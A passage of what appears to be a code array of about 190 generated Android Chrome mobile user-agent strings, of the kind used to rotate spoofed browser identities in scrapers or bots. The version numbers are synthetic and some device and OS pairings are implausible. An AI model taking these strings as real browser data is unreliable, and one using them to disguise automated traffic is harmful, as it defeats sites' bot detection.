    "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4229.154 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4248.161 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4267.168 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4286.175 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4305.182 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4324.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4343.196 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4362.203 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4381.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4400.217 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4419.224 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4438.231 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4457.238 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4476.245 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4495.52 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4514.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4533.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4552.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4571.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4590.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4609.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4628.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4647.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4666.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4685.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4704.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4723.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4742.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4761.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4780.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4799.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4818.171 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4837.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4856.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4875.192 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4894.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4913.206 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4932.213 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4951.220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4970.227 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4989.234 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5008.241 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5027.248 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5046.55 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5065.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5084.69 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5103.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5122.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5141.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5160.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5179.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5198.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5217.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5236.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5255.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.5274.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5293.146 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5312.153 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5331.160 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5350.167 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5369.174 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5388.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5407.188 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5426.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5445.202 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5464.209 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5483.216 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5502.223 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5521.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5540.237 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5559.244 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5578.51 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5597.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5616.65 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5635.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.5654.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5673.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5692.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5711.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5730.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5749.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5768.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5787.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5806.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5825.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5844.149 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5863.156 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5882.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5901.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5920.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5939.184 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5958.191 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5977.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5996.205 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6015.212 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6034.219 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6053.226 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.6072.233 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.6091.240 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.6110.247 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6129.54 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.6148.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.6167.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.6186.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.6205.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.6224.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.6243.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.6262.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.6281.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.6300.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.6319.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6338.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6357.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6376.145 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6395.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6414.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6433.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.6452.173 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.6471.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.6490.187 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6509.194 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.6528.201 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.6547.208 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.6566.215 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.6585.222 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.6604.229 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.6623.236 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.6642.243 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.6661.50 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.6680.57 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.6699.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6718.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6737.78 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6756.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6775.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6794.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6813.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.6832.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.6851.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.6870.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6889.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.6908.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.6927.148 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.6946.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.6965.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.6984.169 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.7003.176 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.7022.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.7041.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.7060.197 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.7079.204 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.7098.211 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7117.218 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.7136.225 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.7155.232 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.7174.239 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.7193.246 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.7212.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.7231.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.7250.67 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.7269.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.7288.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.7307.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.7326.95 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.7345.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.7364.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.7383.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.7402.123 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.7421.130 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.7440.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.7459.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.7478.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7497.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.7516.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.7535.172 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.7554.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.7573.186 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.7592.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.7611.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.7630.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.7649.214 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.7668.221 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.7687.228 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.7706.235 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.7725.242 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.7744.249 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.7763.56 Mobile Safari/537.36",
